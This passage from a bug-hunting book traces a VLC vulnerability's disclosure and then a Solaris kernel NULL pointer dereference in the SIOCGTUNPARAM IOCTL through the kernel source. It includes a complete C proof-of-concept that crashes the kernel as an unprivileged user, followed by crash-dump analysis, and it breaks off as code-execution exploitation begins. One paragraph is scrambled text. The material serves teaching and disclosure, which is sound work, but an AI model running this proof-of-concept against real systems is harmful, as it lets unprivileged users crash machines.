DEP. Because I used a default installation of\nWindows Vista 32-bit, the system-wide DEP policy should be set to\nOptIn. To verify this, I used the bcdedit.exe console application from\nan elevated command prompt:\nC:\\Windows\\system32>bcdedit /enum | findstr nx\nnx OptIn\nThe output of the command shows that the system was indeed\nconfigured to use the OptIn operation mode of DEP, which explains\nwhy VLC doesn’t use this mitigation technique: The process simply\ndoesn’t opt in to DEP.\n20 Chapter 2\nThere are different ways to opt a process in to DEP. For example,\nyou could use the appropriate linker switch (/NXCOMPAT) at com-\npile time, or you could use the SetProcessDEPPolicy API to allow an\napplication to opt in to DEP programmatically.\nTo get an overview of the security-relevant compile-time options\nused by VLC, I scanned the executable files of the media player with\nLookingGlass (see Figure 2-9).11\nnote In 2009, Microsoft released a tool called BinScope Binary Analyzer,\nwhich analyzes binaries for a wide variety of security protections with\na very straightforward and easy-to-use interface.12\nLookingGlass showed that the linker switch for neither ASLR\nnor DEP was used to compile VLC.13 The Windows releases of VLC\nmedia player are built using the Cygwin14 environment, a set of utili-\nties designed to provide the look and feel of Linux within the Windows\noperating system. Since the linker switches that I mentioned are sup-\nported only by Microsoft’s Visual C++ 2005 SP1 and later (and thus\nare not supported by Cygwin), it isn’t a big surprise that they aren’t\nsupported by VLC.\n← Exploit\nmitigation\ntechniques of\nMicrosoft’s Visual\nC++ 2005 SP1\nand later:\n• /GS for stack\ncookies/canaries\n• /DynAMICbASE\nfor ASLR\n• /nxCOMPAT for\ndep/nx\n• /SAfESEh for\nexception handler\nprotection\nFigure 2-9: LookingGlass scan result of VLC\nBack to the ’90s 21\nSee the following excerpt from the VLC build instructions:\n[..]\nBuilding VLC from the source code\n=================================\n[..]\n- natively on Windows, using cygwin (www.cygwin.com) with or without the POSIX\nemulation layer. This is the preferred way to compile vlc if you want to do it on\nWindows.\n[..]\nUNSUPPORTED METHODS\n-------------------\n[..]\n- natively on Windows, using Microsoft Visual Studio. This will not work.\n[..]\nAt the time of this writing, VLC didn’t make use of any of the\nexploit mitigation techniques provided by Windows Vista or later\nreleases. As a result, every bug in VLC under Windows is as easily\nexploited today as 20 years ago, when none of these security features\nwere widely deployed or supported.\n2.4 lessons learned\nAs a programmer:\n• Never trust user input (this includes file data, network data, etc.).\n• Never use unvalidated length or size values.\n• Always make use of the exploit mitigation techniques offered by\nmodern operating systems wherever possible. Under Windows,\nsoftware has to be compiled with Microsoft’s Visual C++ 2005\nSP1 or later, and the appropriate compiler and linker options\nhave to be used. In addition, Microsoft has released the Enhanced\nMitigation Experience Toolkit,15 which allows specific mitigation tech-\nniques to be applied without recompilation.\nAs a user of media players:\n• Don’t ever trust media file extensions (see Section 2.5 below).\n2.5 Addendum\nMonday, October 20, 2008\nSince the vulnerability was fixed and a new version of VLC is now avail-\nable, I released a detailed security advisory on my website (Figure 2-10\nshows the timeline).16 The bug was assigned CVE-2008-4654.\n22 Chapter 2\nnote According to the documentation provided by MITRE,17 Common\nVulnerabilities and Exposures Identifiers (also called CVE names,\nCVE numbers, CVE-IDs, and CVEs) are “unique, common identi-\nfiers for publicly known i nformation security vulnerabilities.”\nPatch developed by\nVLC maintainers\nVLC maintainers\nnotified Fixed VLC version Release date of my\navailable security advisory\n10.18.2008 10.20.2008\nFigure 2-10: Timeline of the vulnerability\nMonday, January 5, 2009\nIn reaction to the bug and my detailed advisory, I got a lot of mail\nwith various questions from worried VLC users. There were two ques-\ntions that I saw over and over:\nI have never heard of the TiVo media format before. Why\nwould I ever open such an obscure media file?\nAm I secure if I don’t open TiVo media files in VLC anymore?\nThese are valid questions, so I asked myself how I would normally\nlearn about the format of a media file I downloaded via the Internet\nwith no more information than the file extension. I could fire up a\nhex editor and have a look at the file header, but to be honest, I don’t\nthink ordinary people would go to the trouble. But are file extensions\ntrustworthy? No, they aren’t. The regular file extension for TiVo files\nis .ty. But what stops an attacker from changing the filename from\nfun.ty to fun.avi, fun.mov, fun.mkv, or whatever she likes? The file will\nstill be opened and processed as a TiVo file by the media player, since\nVLC, like almost all media players, does not use file extensions to\nrecognize the media format.\nnotes\n1. See Dick Grune and Ceriel J.H. Jacobs, Parsing Techniques: A Practical Guide,\n2nd ed. (New York: Springer Science+Business Media, 2008), 1.\n2. The vulnerable source code version of VLC can be downloaded at http://\ndownload.videolan.org/pub/videolan/vlc/0.9.4/vlc-0.9.4.tar.bz2.\nBack to the ’90s 23\n3. Immunity Debugger is a great Windows debugger based on OllyDbg. It\ncomes with a nice GUI and a lot of extra features and plug-ins to support bug\nhunting and exploit development. It can be found at http://www.immunityinc\n.com/products-immdbg.shtml.\n4. See David Litchfield, “Variations in Exploit Methods Between Linux\nand Windows,” 2003, http://www.nccgroup.com/Libraries/Document_Downloads/\nVariations_in_Exploit_methods_between_Linux_and_Windows.sflb.ashx.\n5. See http://www.trapkit.de/books/bhd/.\n6. For more information on responsible, coordinated, and full disclosure\nas well as the commercial vulnerability market, consult Stefan Frei, Dominik\nSchatzmann, Bernhard Plattner, and Brian Trammel, “Modelling the Security\nEcosystem—The Dynamics of (In)Security,” 2009, http://www.techzoom.net/\npublications/security-ecosystem/.\n7. The Git repository of VLC can be found at http://git.videolan.org/. The first\nfix issued for this bug can be downloaded from http://git.videolan.org/?p=vlc\n.git;a=commitdiff;h=26d92b87bba99b5ea2e17b7eaa39c462d65e9133.\n8. The fix for the subsequent VLC bug that I found can be downloaded from\nhttp://git.videolan.org/?p=vlc.git;a=commitdiff;h=d859e6b9537af2d7326276f70de2\n5a840f554dc3.\n9. To download Process Explorer, visit http://technet.microsoft.com/en-en/\nsysinternals/bb896653/.\n10. See http://blogs.technet.com/b/srd/archive/2009/06/12/understanding-dep-as-a-\nmitigation-technology-part-1.aspx.\n11. LookingGlass is a handy tool to scan a directory structure or the running\nprocesses to report which binaries do not make use of ASLR and NX. It can\nbe found at http://www.erratasec.com/lookingglass.html.\n12. To download BinScope Binary analyzer, visit http://go.microsoft.com/\n?linkid=9678113.\n13. A good article on the exploit mitigation techniques introduced by Micro-\nsoft Visual C++ 2005 SP1 and later: Michael Howard, “Protecting Your Code\nwith Visual C++ Defenses,” MSDN Magazine, March 2008, http://msdn.microsoft\n.com/en-us/magazine/cc337897.aspx.\n14. See http://www.cygwin.com/.\n15. The Enhanced Mitigation Experience Toolkit is available at http://\nblogs.technet.com/srd/archive/2010/09/02/enhanced-mitigation-experience-toolkit-\nemet-v2-0-0.aspx.\n16. My security advisory that describes the details of the VLC vulnerability can\nbe found at http://www.trapkit.de/advisories/TKADV2008-010.txt.\n17. See http://cve.mitre.org/cve/identifiers/index.html.\n24 Chapter 2\n3\nesCApe from tHe www Zone\nThursday, August 23, 2007\nDear Diary,\nI’ve always been a big fan of vulnerabilities\nin operating system kernels because they’re\nusually quite interesting, very powerful, and\ntricky to exploit. I recently combed through\ns o t g h e u f v r e b e o s u r u s a g g w l s h . o h O p a w t e a n ? r s e a I t t o h w in f e a g t s k h s s e e u y r s c k n t c e e e e m r l s n o s e f k f u l e S s l r . u t n ☺ h n e a l S t s o I i n l s a e r s a i e s r a . c r A h c n e h d d ← S C g u a o e O n s r n n p “ e w o O r J a r a r a a s l a l n t y a c i u o l c e r a n q e r u . S f y e i O o r r 2 l e r a s d a 7 r t c , i o s b l 2 e . y ” S 0 n o O 1 o l r a w 0 a r , c i s l e\n3.1 Vulnerability Discovery\nSince the launch of OpenSolaris in June 2005, Sun has made most of\nits Solaris 10 operating system freely available as open source, includ-\ning the kernel. So I downloaded the source code1 and started reading\nthe kernel code, focusing on the parts that implement the user-to-\nkernel interfaces, like IOCTLs and system calls.\nnote Input/output controls (IOCTLs) are used ← Any user-to-\nfor communication between user-mode applica- kernel interface or\ntions and the kernel.2 API that results in\ninformation being\nThe vulnerability that I found is one of passed over to the\nthe most interesting I’ve discovered because\nkernel for processing\ncreates a potential\nits cause—an undefined error condition—is attack vector. The\nunusual for an exploitable vulnerability (com- most commonly\npared to the average overflow bugs). It affects used are:\nthe implementation of the SIOCGTUNPARAM IOCTL\n• IOCTLs\n• System calls\ncall, which is part of the IP-in-IP tunneling\n• filesystems\nmechanism provided by the Solaris kernel.3 • network stack\nI took the following steps to find the • hooks of third-party\nvulnerability: drivers\n• Step 1: List the IOCTLs of the kernel.\n• Step 2: Identify the input data.\n• Step 3: Trace the input data.\nThese steps are described in detail below.\nStep 1: List the IOCTLs of the Kernel\nThere are different ways to generate a list of the IOCTLs of a kernel.\nIn this case, I simply searched the kernel source code for the custom-\nary IOCTL macros. Every IOCTL gets its own number, usually cre-\nated by a macro. Depending on the IOCTL type, the Solaris kernel\ndefines the following macros: _IOR, _IOW, and _IOWR. To list the IOCTLs,\nI changed to the directory where I unpacked the kernel source code\nand used the Unix grep command to search the code.\nsolaris$ pwd\n/exports/home/tk/on-src/usr/src/uts\nsolaris$ grep -rnw -e _IOR -e _IOW -e _IOWR *\n[..]\ncommon/sys/sockio.h:208:#define SIOCTONLINK _IOWR('i', 145, struct sioc_addr req)\ncommon/sys/sockio.h:210:#define SIOCTMYSITE _IOWR('i', 146, struct sioc_addr req)\ncommon/sys/sockio.h:213:#define SIOCGTUNPARAM _IOR('i', 147, struct iftun_req)\ncommon/sys/sockio.h:216:#define SIOCSTUNPARAM _IOW('i', 148, struct iftun_req)\ncommon/sys/sockio.h:220:#define SIOCFIPSECONFIG _IOW('i', 149, 0) /* Flush Policy */\ncommon/sys/sockio.h:221:#define SIOCSIPSECONFIG _IOW('i', 150, 0) /* Set Policy */\ncommon/sys/sockio.h:222:#define SIOCDIPSECONFIG _IOW('i', 151, 0) /* Delete Policy */\ncommon/sys/sockio.h:223:#define SIOCLIPSECONFIG _IOW('i', 152, 0) /* List Policy */\n[..]\n26 Chapter 3\nI now had a list of IOCTL names supported by the Solaris kernel.\nTo find the source files that actually process these IOCTLs, I searched\nthe whole kernel source for each IOCTL name on the list. Here is an\nexample search for the SIOCTONLINK IOCTL:\nsolaris$ grep --include=*.c -rn SIOCTONLINK *\ncommon/inet/ip/ip.c:1267: /* 145 */ { SIOCTONLINK, sizeof (struct sioc_add rreq), →\nIPI_GET_CMD,\nStep 2: Identify the Input Data\nThe Solaris kernel provides different interfaces for IOCTL process-\ning. The interface that is relevant for the vulnerability I found is a\nprogramming model called STREAMS.4 Intuitively, the fundamental\nSTREAMS unit is called a Stream, which is a data transfer path between\na process in user space and the kernel. All kernel-level input and out-\nput under STREAMS are based on STREAMS messages, which usually\ncontain the following elements: a data buffer, a data block, and a mes-\nsage block. The data buffer is the location in memory where the actual\ndata of the message is stored. The data block (struct datab) describes\nthe data buffer. The message block (struct msgb) describes the data\nblock and how the data is used.\nThe message block structure has the following public elements.\nSource code file uts/common/sys/stream.h5\n[..]\n367 /*\n368 * Message block descriptor\n369 */\n370 typedef struct msgb {\n371 struct msgb *b_next;\n372 struct msgb *b_prev;\n373 struct msgb *b_cont;\n374 unsigned char *b_rptr;\n375 unsigned char *b_wptr;\n376 struct datab *b_datap;\n377 unsigned char b_band;\n378 unsigned char b_tag;\n379 unsigned short b_flag;\n380 queue_t *b_queue; /* for sync queues */\n381 } mblk_t;\n[..]\nThe structure elements b_rptr and b_wptr specify the current\nread and write pointers in the data buffer pointed to by b_datap\n(see Figure 3-1).\nEscape from the WWW Zone 27\nb_datap\nmsgb\ndatab\nb_rptr\ndb_base\ndata\nbuffer\nb_wptr\ndb_lim\nFigure 3-1: Diagram of a simple STREAMS message\nWhen using the STREAMS model, the IOCTL input data is refer-\nenced by the b_rptr element of the msgb structure, or its typedef mblk_t.\nAnother important component of the STREAMS model is the so-called\nlinked message blocks. As described in the STREAMS Programming Guide,\n“[a] complex message can consist of several linked message blocks. If\nbuffer size is limited or if processing expands the message, multiple\nmessage blocks are formed in the message” (see Figure 3-2).\nb_cont b_cont\nmblk_t mblk_t mblk_t\ndblk_t dblk_t dblk_t\ndata buffer data buffer data buffer\nFigure 3-2: Diagram of linked STREAMS message blocks\nStep 3: Trace the Input Data\nI then took the list of IOCTLs and started reviewing the code. As\nusual, I searched the code for input data and then traced that data\nwhile looking for coding errors. After a few hours, I found the\nvulnerability.\n28 Chapter 3\nSource code file uts/common/inet/ip/ip.c\nFunction ip_process_ioctl() 6\n[..]\n26692 void\n26693 ip_process_ioctl(ipsq_t *ipsq, queue_t *q, mblk_t *mp, void *arg)\n26694 {\n[..]\n26717 ci.ci_ipif = NULL;\n[..]\n26735 case TUN_CMD:\n26736 /*\n26737 * SIOC[GS]TUNPARAM appear here. ip_extract_tunreq returns\n26738 * a refheld ipif in ci.ci_ipif\n26739 */\n26740 err = ip_extract_tunreq(q, mp, &ci.ci_ipif, ip_process_ioctl);\n[..]\nWhen a SIOCGTUNPARAM IOCTL request is sent to the kernel, the\nfunction ip_process_ioctl() is called. In line 26717, the value of ci.ci_\nipif is explicitly set to NULL. Because of the SIOCGTUNPARAM IOCTL call,\nthe switch case TUN_CMD is chosen (see line 26735), and the function\nip_extract_tunreq() is called (see line 26740).\nSource code file uts/common/inet/ip/ip_if.c\nFunction ip_extract_tunreq() 7\n[..]\n8158 /*\n8159 * Parse an iftun_req structure coming down SIOC[GS]TUNPARAM ioctls,\n8160 * refhold and return the associated ipif\n8161 */\n8162 /* ARGSUSED */\n8163 int\n8164 ip_extract_tunreq(queue_t *q, mblk_t *mp, const ip_ioctl_cmd_t *ipip,\n8165 cmd_info_t *ci, ipsq_func_t func)\n8166 {\n8167 boolean_t exists;\n8168 struct iftun_req *ta;\n8169 ipif_t *ipif;\n8170 ill_t *ill;\n8171 boolean_t isv6;\n8172 mblk_t *mp1;\n8173 int error;\n8174 conn_t *connp;\n8175 ip_stack_t *ipst;\n8176\n8177 /* Existence verified in ip_wput_nondata */\n8178 mp1 = mp->b_cont->b_cont;\n8179 ta = (struct iftun_req *)mp1->b_rptr;\nEscape from the WWW Zone 29\n8180 /*\n8181 * Null terminate the string to protect against buffer\n8182 * overrun. String was generated by user code and may not\n8183 * be trusted.\n8184 */\n8185 ta->ifta_lifr_name[LIFNAMSIZ - 1] = '\\0';\n8186\n8187 connp = Q_TO_CONN(q);\n8188 isv6 = connp->conn_af_isv6;\n8189 ipst = connp->conn_netstack->netstack_ip;\n8190\n8191 /* Disallows implicit create */\n8192 ipif = ipif_lookup_on_name(ta->ifta_lifr_name,\n8193 mi_strlen(ta->ifta_lifr_name), B_FALSE, &exists, isv6,\n8194 connp->conn_zoneid, CONNP_TO_WQ(connp), mp, func, &error, ipst);\n[..]\nIn line 8178, a linked STREAMS message block is referenced,\nand on line 8179, the structure ta is filled with the user-controlled\nIOCTL data. Later on, the function ipif_lookup_on_name() is called\n(see line 8192). The first two parameters of ipif_lookup_on_name()\nderive from the user-controllable data of structure ta.\nSource code file uts/common/inet/ip/ip_if.c\nFunction ipif_lookup_on_name()\n[..]\n19116 /*\n19117 * Find an IPIF based on the name passed in. Names can be of the\n19118 * form <phys> (e.g., le0), <phys>:<#> (e.g., le0:1),\n19119 * The <phys> string can have forms like <dev><#> (e.g., le0),\n19120 * <dev><#>.<module> (e.g. le0.foo), or <dev>.<module><#> (e.g. ip.tun3).\n19121 * When there is no colon, the implied unit id is zero. <phys> must\n19122 * correspond to the name of an ILL. (May be called as writer.)\n19123 */\n19124 static ipif_t *\n19125 ipif_lookup_on_name(char *name, size_t namelen, boolean_t do_alloc,\n19126 boolean_t *exists, boolean_t isv6, zoneid_t zoneid, queue_t *q,\n19127 mblk_t *mp, ipsq_func_t func, int *error, ip_stack_t *ipst)\n19128 {\n[..]\n19138 if (error != NULL)\n19139 *error = 0;\n[..]\n19154 /* Look for a colon in the name. */\n19155 endp = &name[namelen];\n19156 for (cp = endp; --cp > name; ) {\n19157 if (*cp == IPIF_SEPARATOR_CHAR)\n19158 break;\n19159 }\n19160\n19161 if (*cp == IPIF_SEPARATOR_CHAR) {\n19162 /*\n19163 * Reject any non-decimal aliases for logical\n19164 * interfaces. Aliases with leading zeroes\n30 Chapter 3\n19165 * are also rejected as they introduce ambiguity\n19166 * in the naming of the interfaces.\n19167 * In order to confirm with existing semantics,\n19168 * and to not break any programs/script relying\n19169 * on that behaviour, if<0>:0 is considered to be\n19170 * a valid interface.\n19171 *\n19172 * If alias has two or more digits and the first\n19173 * is zero, fail.\n19174 */\n19175 if (&cp[2] < endp && cp[1] == '0')\n19176 return (NULL);\n19177 }\n[..]\nIn line 19139, the value of error is explicitly set to 0. Then in\nline 19161, the interface name provided by the user-controlled IOCTL\ndata is checked for the presence of a colon (IPIF_SEPARATOR_CHAR is\ndefined as a colon). If a colon is found in the name, the bytes after the\ncolon are treated as an interface alias. If an alias has two or more digits\nand the first is zero (ASCII zero or hexadecimal 0x30; see line 19175),\nthe function ipif_lookup_on_name() returns to ip_extract_tunreq() with\na return value of NULL, and the variable error is still set to 0 (see\nlines 19139 and 19176).\nSource code file uts/common/inet/ip/ip_if.c\nFunction ip_extract_tunreq()\n[..]\n8192 ipif = ipif_lookup_on_name(ta->ifta_lifr_name,\n8193 mi_strlen(ta->ifta_lifr_name), B_FALSE, &exists, isv6,\n8194 connp->conn_zoneid, CONNP_TO_WQ(connp), mp, func, &error, ipst);\n8195 if (ipif == NULL)\n8196 return (error);\n[..]\nBack in ip_extract_tunreq(), the pointer ipif is set to NULL if ipif_\nlookup_on_name() returns that value (see line 8192). Since ipif is NULL,\nthe if statement in line 8195 returns TRUE, and line 8196 is executed.\nThe ip_extract_tunreq() function then returns to ip_process_ioctl()\nwith error as a return value, which is still set to 0.\nSource code file uts/common/inet/ip/ip.c\nFunction ip_process_ioctl()\n[..]\n26717 ci.ci_ipif = NULL;\n[..]\n26735 case TUN_CMD:\nEscape from the WWW Zone 31\n26736 /*\n26737 * SIOC[GS]TUNPARAM appear here. ip_extract_tunreq returns\n26738 * a refheld ipif in ci.ci_ipif\n26739 */\n26740 err = ip_extract_tunreq(q, mp, &ci.ci_ipif, ip_process_ioctl);\n26741 if (err != 0) {\n26742 ip_ioctl_finish(q, mp, err, IPI2MODE(ipip), NULL);\n26743 return;\n26744 }\n[..]\n26788 err = (*ipip->ipi_func)(ci.ci_ipif, ci.ci_sin, q, mp, ipip,\n26789 ci.ci_lifr);\n[..]\nBack in ip_process_ioctl(), the variable err is set to 0 since\nip_extract_tunreq() returns that value (see line 26740). Because err\nequals 0, the if statement in line 26741 returns FALSE, and lines 26742\nand 26743 are not executed. In line 26788, the function pointed to by\nipip->ipi_func—in this case the function ip_sioctl_tunparam()—is called\nwhile the first parameter, ci.ci_ipif, is still set to NULL (see line 26717).\nSource code file uts/common/inet/ip/ip_if.c\nFunction ip_sioctl_tunparam()\n[..]\n9401 int\n9402 ip_sioctl_tunparam(ipif_t *ipif, sin_t *dummy_sin, queue_t *q, mblk_t *mp,\n9403 ip_ioctl_cmd_t *ipip, void *dummy_ifreq)\n9404 {\n[..]\n9432 ill = ipif->ipif_ill;\n[..]\nSince the first parameter of ip_sioctl_tunparam() is NULL, the refer-\nence ipif->ipif_ill in line 9432 can be represented as NULL->ipif_ill,\nwhich is a classic NULL pointer dereference. If this NULL pointer\ndereference is triggered, the whole system will crash due to a ker-\nnel panic. (See Section A.2 for more information on NULL pointer\ndereferences.)\nSummary of the results so far:\n• An unprivileged user of a Solaris system can call the SIOCGTUNPARAM\nIOCTL (see (1) in Figure 3-3).\n• If the IOCTL data sent to the kernel is carefully crafted—there\nhas to be an interface name with a colon directly followed by an\nASCII zero and another arbitrary digit—it’s possible to trigger a\nNULL pointer dereference (see (2) in Figure 3-3) that leads to a\nsystem crash (see (3) in Figure 3-3).\n32 Chapter 3\nBut why is it possible to trigger that NULL pointer dereference?\nWhere exactly is the coding error that leads to the bug?\nThe problem is that ipif_lookup_on_name() can be forced to return\nto its caller function without an appropriate error condition being set.\nThis bug exists in part because the ipif_lookup_on_name() function\nreports error conditions to its caller in two different ways: through the\nreturn value of the function (return (null)) as well as through the vari-\nable error (*error != 0). Each time the function is called, the authors of\nthe kernel code must ensure that both error conditions are properly\nset and are properly evaluated within the caller function. Such a cod-\ning style is error-prone and therefore not recommended. The vulner-\nability described in this chapter is an excellent example of the kind of\nproblem that can arise from such code.\nKernel System\ncrash\nInterface name SIOCGTUNPARAM (2) (3)\nIOCTL request\n„:01“\n(1)\nNULL->ipif_ill\nFigure 3-3: Summary of the results so far . An unprivileged user can force a system crash\nby triggering a NULL pointer dereference in the Solaris kernel .\nSource code file uts/common/inet/ip/ip_if.c\nFunction ipif_lookup_on_name()\n[..]\n19124 static ipif_t *\n19125 ipif_lookup_on_name(char *name, size_t namelen, boolean_t do_alloc,\n19126 boolean_t *exists, boolean_t isv6, zoneid_t zoneid, queue_t *q,\n19127 mblk_t *mp, ipsq_func_t func, int *error, ip_stack_t *ipst)\n19128 {\n[..]\n19138 if (error != NULL)\n19139 *error = 0;\n[..]\n19161 if (*cp == IPIF_SEPARATOR_CHAR) {\n19162 /*\n19163 * Reject any non-decimal aliases for logical\n19164 * interfaces. Aliases with leading zeroes\nEscape from the WWW Zone 33\n19165 * are also rejected as they introduce ambiguity\n19166 * in the naming of the interfaces.\n19167 * In order to confirm with existing semantics,\n19168 * and to not break any programs/script relying\n19169 * on that behaviour, if<0>:0 is considered to be\n19170 * a valid interface.\n19171 *\n19172 * If alias has two or more digits and the first\n19173 * is zero, fail.\n19174 */\n19175 if (&cp[2] < endp && cp[1] == '0')\n19176 return (NULL);\n19177 }\n[..]\nIn line 19139, the value of error, which holds one of the error\nconditions, is explicitly set to 0. Error condition 0 means that no\nerror has occurred so far. By supplying a colon directly followed by\nan ASCII zero and an arbitrary digit in the interface name, it is pos-\nsible to trigger the code in line 19176, which leads to a return to the\ncaller function. The problem is that no valid error condition is set for\nerror before the function returns. So ipif_lookup_on_name() returns to\nip_extract_tunreq() with error still set to 0.\nSource code file uts/common/inet/ip/ip_if.c\nFunction ip_extract_tunreq()\n[..]\n8192 ipif = ipif_lookup_on_name(ta->ifta_lifr_name,\n8193 mi_strlen(ta->ifta_lifr_name), B_FALSE, &exists, isv6,\n8194 connp->conn_zoneid, CONNP_TO_WQ(connp), mp, func, &error, ipst);\n8195 if (ipif == NULL)\n8196 return (error);\n[..]\nBack in ip_extract_tunreq(), the error condition is returned to its\ncaller function ip_process_ioctl() (see line 8196).\nSource code file uts/common/inet/ip/ip.c\nFunction ip_process_ioctl()\n[..]\n26735 case TUN_CMD:\n26736 /*\n26737 * SIOC[GS]TUNPARAM appear here. ip_extract_tunreq returns\n26738 * a refheld ipif in ci.ci_ipif\n26739 */\n26740 err = ip_extract_tunreq(q, mp, &ci.ci_ipif, ip_process_ioctl);\n26741 if (err != 0) {\n26742 ip_ioctl_finish(q, mp, err, IPI2MODE(ipip), NULL);\n26743 return;\n26744 }\n34 Chapter 3\n[..]\n26788 err = (*ipip->ipi_func)(ci.ci_ipif, ci.ci_sin, q, mp, ipip,\n26789 ci.ci_lifr);\n[..]\nThen in ip_process_ioctl(), the error condition is still set to 0.\nThus, the if statement in line 26741 returns FALSE, and the kernel con-\ntinues the execution of the rest of the function leading to the NULL\npointer dereference in ip_sioctl_tunparam().\nWhat a nice bug!\nFigure 3-4 shows a call graph summarizing the relationships of the\nfunctions involved in the NULL pointer dereference bug.\n(1) (2)\nip_process_ioctl() ip_extract_tunreq() ipif_lookup_on_name()\n(4) (3)\n(5)\nip_sioctl_tunparam()\n(6)\nNULL Pointer Dereference\nFigure 3-4: Call graph summarizing the relationships of the functions involved in the NULL pointer\ndereference bug . The numbers shown refer to the chronological order of events .\n3.2 exploitation\nExploiting this bug was an exciting challenge.\n← The platform that\nNULL pointer dereferences are usually labeled I used throughout this\nas unexploitable bugs because they can generally section was the default\nbe used for a denial-of-service attack but not for installation of Solaris 10\narbitrary code execution. However, this NULL 10/08 x86/x64 DVD\nfull Image (sol-10-u6-\npointer dereference is different, as it can be suc- ga1-x86-dvd.iso), which\ncessfully exploited for arbitrary code execution is called Solaris 10\nat the kernel level. Generic_137138-09.\nTo exploit the vulnerability, I performed the\nfollowing steps:\n1. Trigger the NULL pointer dereference for a denial of service.\n2. Use the zero page to get control over EIP/RIP.\nStep 1: Trigger the NULL Pointer Dereference for a Denial of\nService\nTo trigger the NULL pointer dereference, I wrote the following proof-\nof-concept (POC) code (see Listing 3-1).\nEscape from the WWW Zone 35\n01 #include <stdio.h>\n02 #include <fcntl.h>\n03 #include <sys/syscall.h>\n04 #include <errno.h>\n05 #include <sys/sockio.h>\n06 #include <net/if.h>\n07\n08 int\n09 main (void)\n10 {\n11 int fd = 0;\n12 char data[32];\n13\n14 fd = open (\"/dev/arp\", O_RDWR);\n15\n16 if (fd < 0) {\n17 perror (\"open\");\n18 return 1;\n19 }\n20\n21 // IOCTL data (interface name with invalid alias \":01\")\n22 data[0] = 0x3a; // colon\n23 data[1] = 0x30; // ASCII zero\n24 data[2] = 0x31; // digit 1\n25 data[3] = 0x00; // NULL termination\n26\n27 // IOCTL call\n28 syscall (SYS_ioctl, fd, SIOCGTUNPARAM, data);\n29\n30 printf (\"poc failed\\n\");\n31 close (fd);\n32\n33 return 0;\n34 }\nListing 3-1: Proof-of-concept code (poc.c) that I wrote to trigger the NULL pointer dereference bug I\nfound in Solaris\nThe POC code first opens the kernel network device /dev/arp (see\nline 14). Note that the devices /dev/tcp and /dev/udp also support the\nSIOCGTUNPARAM IOCTL and could therefore be used instead of /dev/arp.\nNext, the IOCTL data is prepared (see lines 22–25). The data consists\nof an interface name with invalid alias :01 to trigger the bug. Finally\nthe SIOCGTUNPARAM IOCTL is called and the IOCTL data is sent to the\nkernel (see line 28).\nI then compiled and tested the POC code as an unprivileged user\non a Solaris 10 64-bit system:\nsolaris$ isainfo -b\n64\nsolaris$ id\nuid=100(wwwuser) gid=1(other)\n36 Chapter 3\nsolaris$ uname -a\nSunOS bob 5.10 Generic_137138-09 i86pc i386 i86pc\nsolaris$ /usr/sfw/bin/gcc -m64 -o poc poc.c\nsolaris$ ./poc\nThe system crashed immediately and rebooted. After the reboot, I\nlogged in as root and inspected the kernel crash files with the help of\nSolaris Modular Debugger (mdb)8 (see Section B.1 for a description\nof the following debugger commands):\nsolaris# id\nuid=0(root) gid=0(root)\nsolaris# hostname\nbob\nsolaris# cd /var/crash/bob/\nsolaris# ls\nbounds unix.0 vmcore.0\nsolaris# mdb unix.0 vmcore.0\nLoading modules: [ unix krtld genunix specfs dtrace cpu.generic uppc pcplusmp ufs ip\nhook neti sctp arp usba fcp fctl nca lofs mpt zfs random sppp audiosup nfs ptm md\ncpc crypto fcip logindmux ]\nI used the ::msgbuf debugger command to display the message\nbuffer, including all console messages up to the kernel panic:\n> ::msgbuf\n[..]\npanic[cpu0]/thread=ffffffff87d143a0:\nBAD TRAP: type=e (#pf Page fault) rp=fffffe8000f7e5a0 addr=8 occurred in module \"ip\"\ndue to a NULL pointer dereference\npoc:\n#pf Page fault\nBad kernel fault at addr=0x8\npid=1380, pc=0xfffffffff6314c7c, sp=0xfffffe8000f7e690, eflags=0x10282\ncr0: 80050033<pg,wp,ne,et,mp,pe> cr4: 6b0<xmme,fxsr,pge,pae,pse>\ncr2: 8 cr3: 21a2a000 cr8: c\nrdi: 0 rsi: ffffffff86bc0700 rdx: ffffffff86bc09c8\nrcx: 0 r8: fffffffffbd0fdf8 r9: fffffe8000f7e780\nrax: c rbx: ffffffff883ff200 rbp: fffffe8000f7e6d0\nr10: 1 r11: 0 r12: ffffffff8661f380\nr13: 0 r14: ffffffff8661f380 r15: ffffffff819f5b40\nfsb: fffffd7fff220200 gsb: fffffffffbc27fc0 ds: 0\nes: 0 fs: 1bb gs: 0\ntrp: e err: 0 rip: fffffffff6314c7c\ncs: 28 rfl: 10282 rsp: fffffe8000f7e690\nss: 30\nEscape from the WWW Zone 37\nfffffe8000f7e4b0 unix:die+da ()\nfffffe8000f7e590 unix:trap+5e6 ()\nfffffe8000f7e5a0 unix:_cmntrap+140 ()\nfffffe8000f7e6d0 ip:ip_sioctl_tunparam+5c ()\nfffffe8000f7e780 ip:ip_process_ioctl+280 ()\nfffffe8000f7e820 ip:ip_wput_nondata+970 ()\nfffffe8000f7e910 ip:ip_output_options+537 ()\nfffffe8000f7e920 ip:ip_output+10 ()\nfffffe8000f7e940 ip:ip_wput+37 ()\nfffffe8000f7e9a0 unix:putnext+1f1 ()\nfffffe8000f7e9d0 arp:ar_wput+9d ()\nfffffe8000f7ea30 unix:putnext+1f1 ()\nfffffe8000f7eab0 genunix:strdoioctl+67b ()\nfffffe8000f7edd0 genunix:strioctl+620 ()\nfffffe8000f7edf0 specfs:spec_ioctl+67 ()\nfffffe8000f7ee20 genunix:fop_ioctl+25 ()\nfffffe8000f7ef00 genunix:ioctl+ac ()\nfffffe8000f7ef10 unix:brand_sys_syscall+21d ()\nsyncing file systems...\ndone\ndumping to /dev/dsk/c0d0s1, offset 107413504, content: kernel\nThe debugger output shows that the kernel panic happened due\nto a NULL pointer dereference at address 0xfffffffff6314c7c (see the\nvalue of the RIP register). Next, I asked the debugger to display the\ninstruction at that address:\n> 0xfffffffff6314c7c::dis\nip_sioctl_tunparam+0x30: jg +0xf0 <ip_sioctl_tunparam+0x120>\nip_sioctl_tunparam+0x36: movq 0x28(%r12),%rax\nip_sioctl_tunparam+0x3b: movq 0x28(%rbx),%rbx\nip_sioctl_tunparam+0x3f: movq %r12,%rdi\nip_sioctl_tunparam+0x42: movb $0xe,0x19(%rax)\nip_sioctl_tunparam+0x46: call +0x5712cfa <copymsg>\nip_sioctl_tunparam+0x4b: movq %rax,%r15\nip_sioctl_tunparam+0x4e: movl $0xc,%eax\nip_sioctl_tunparam+0x53: testq %r15,%r15\nip_sioctl_tunparam+0x56: je +0x9d <ip_sioctl_tunparam+0xf3>\nip_sioctl_tunparam+0x5c: movq 0x8(%r13),%r14\n[..]\nThe crash was caused by the instruction movq 0x8(%r13),%r14 at\naddress 